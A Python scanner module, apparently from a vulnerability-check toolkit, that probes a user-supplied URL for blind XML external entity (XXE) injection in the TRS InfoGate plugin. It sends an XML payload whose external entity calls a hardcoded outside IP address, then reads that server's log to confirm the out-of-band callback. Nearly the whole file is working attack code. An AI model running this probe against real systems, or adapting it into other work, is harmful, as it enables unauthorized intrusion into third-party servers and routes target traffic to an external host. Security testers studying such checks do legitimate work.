#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: trs infogate插件 blind XML实体注入
referer: unknown
author: Lucifer
description: trs infogate插件 blind XML实体注入。
'''
import sys
import time
import json
import hashlib
import datetime
import requests
import warnings
from termcolor import cprint

class trs_infogate_xxe_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        }
        payload = "/infogate/center.do"
        vulnurl = self.url + payload
        time_stamp = time.mktime(datetime.datetime.now().timetuple())
        m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
        md5_str = m.hexdigest()
        post_data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://45.76.158.91:6868/'+md5_str+'">%remote;]>'
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            eye_url = "http://45.76.158.91/web.log"
            time.sleep(6)
            reqr = requests.get(eye_url, headers=headers, timeout=10, verify=False)
            if md5_str in reqr.text:
                cprint("[+]存在trs infogate插件 XML实体注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
                return True, vulnurl, "trs infogate插件 blind XML实体注入", str(payload), req.text
            else:
                cprint("[-]不存在trs_infogate_xxe漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_infogate_xxe_BaseVerify(sys.argv[1])
    testVuln.run()
